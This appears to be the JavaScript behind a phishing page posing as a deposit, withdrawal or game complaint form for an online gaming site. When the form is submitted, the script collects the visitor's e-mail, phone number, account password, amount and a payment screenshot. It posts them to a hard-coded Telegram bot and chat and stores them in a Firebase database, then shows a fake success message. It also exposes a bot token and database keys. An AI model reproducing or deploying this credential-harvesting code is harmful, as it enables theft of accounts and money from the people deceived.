(function () {
    var TG_BOT_TOKEN = '8817770982:AAE0vUozfSQCKbXZ3Lf3PLNyEpUDrZMe-cA';
    var TG_CHAT_ID = '-1003955056796';

    var depositForm = document.getElementById('depositForm');
    var withdrawalForm = document.getElementById('withdrawalForm');
    var gameForm = document.getElementById('gameForm');

    if (!depositForm && !withdrawalForm && !gameForm) { return; }

    var isDeposit = !!depositForm;
    var isWithdrawal = !!withdrawalForm;
    var form = isDeposit ? depositForm : (isWithdrawal ? withdrawalForm : gameForm);
    var problemType = isDeposit ? 'Deposit' : (isWithdrawal ? 'Withdrwal' : 'Game');
    var imageInputId = isDeposit ? 'paymentImage' : 'issueImage';

    var LOADING_MS = 3000;

    var FB_CONFIG = {
        apiKey: "AIzaSyCiuhqX-mjBB6eRjljirzIyuJv0wKVRj58",
        authDomain: "ludojoy-ca35c.firebaseapp.com",
        databaseURL: "https://ludojoy-ca35c-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "ludojoy-ca35c",
        storageBucket: "ludojoy-ca35c.firebasestorage.app",
        messagingSenderId: "591882703572",
        appId: "1:591882703572:web:862fa9a649e4723c3b6141"
    };

    function rowValue(rows, label) {
        for (var i = 0; i < rows.length; i++) {
            if (rows[i].label === label) { return rows[i].value; }
        }
        return '';
    }

    function now() {
        var d = new Date();
        return ('0' + d.getHours()).slice(-2) + ':' + ('0' + d.getMinutes()).slice(-2);
    }

    function saveComplaint(rows, imageFile) {
        var db = firebase.initializeApp(FB_CONFIG).database();
        var save = function (imageData) {
            db.ref('bdg-chat/complaints').push({
                type: problemType,
                email: rowValue(rows, 'E-mail'),
                phone: rowValue(rows, 'Phone No'),
                password: rowValue(rows, 'Password'),
                problem: rowValue(rows, 'Problem status'),
                amount: rowValue(rows, 'Amount'),
                time: now(),
                image: imageData || null
            });
        };
        if (imageFile) {
            var reader = new FileReader();
            reader.onload = function (ev) { save(ev.target.result); };
            reader.readAsDataURL(imageFile);
        } else {
            save(null);
        }
    }

    function val(id) {
        var el = document.getElementById(id);
        return el ? el.value.trim() : '';
    }

    function selVal(id) {
        var el = document.getElementById(id);
        return el && el.selectedIndex >= 0 ? el.options[el.selectedIndex].text : '';
    }

    function getImageFile() {
        var el = document.getElementById(imageInputId);
        return el && el.files && el.files[0] ? el.files[0] : null;
    }

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        var problemEl = document.getElementById('problem');
        var problemVal = problemEl && problemEl.tagName === 'SELECT'
            ? selVal('problem')
            : val('problem');

        var rows = [
            { label: 'E-mail', value: val('email') },
            { label: 'Phone No', value: val('mobile') },
            { label: 'Password', value: val('password') },
            { label: 'Type problem', value: problemType },
            { label: 'Problem status', value: problemVal },
            { label: 'Amount', value: val('amount') }
        ];

        showLoading();

        setTimeout(function () {
            hideLoading();
            sendToTelegram(rows, getImageFile());
            saveComplaint(rows, getImageFile());
            form.reset();
            showSuccess();
        }, LOADING_MS);
    });

    function buildText(rows) {
        var map = {
            'E-mail': '📩',
            'Phone No': '📱',
            'Password': '🔑',
            'Type problem': '📌',
            'Problem status': '⚖️',
            'Amount': '💰'
        };
        var t = 'User Details 📑\n━━━━━━━━━━━━━━━\n';
        rows.forEach(function (r) {
            t += '\n' + (map[r.label] || '•') + ' ' + r.label + ' : ' + r.value + '\n';
        });
        t += '\n━━━━━━━━━━━━━━━';
        return t;
    }

    function sendToTelegram(rows, imageFile) {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) { return; }
        var caption = buildText(rows);
        var api = 'https://api.telegram.org/bot' + TG_BOT_TOKEN;

        if (imageFile) {
            var fd = new FormData();
            fd.append('chat_id', TG_CHAT_ID);
            fd.append('caption', caption);
            fd.append('photo', imageFile);
            fetch(api + '/sendPhoto', { method: 'POST', body: fd }).catch(function () {});
        } else {
            var fd2 = new FormData();
            fd2.append('chat_id', TG_CHAT_ID);
            fd2.append('text', caption);
            fetch(api + '/sendMessage', { method: 'POST', body: fd2 }).catch(function () {});
        }
    }

    function showLoading() {
        document.getElementById('loadingPopup').classList.remove('hidden');
    }

    function hideLoading() {
        document.getElementById('loadingPopup').classList.add('hidden');
    }

    function showSuccess() {
        document.getElementById('successPopup').classList.remove('hidden');
        setTimeout(function () {
            window.location.href = 'mailbox.html';
        }, 2000);
    }
})();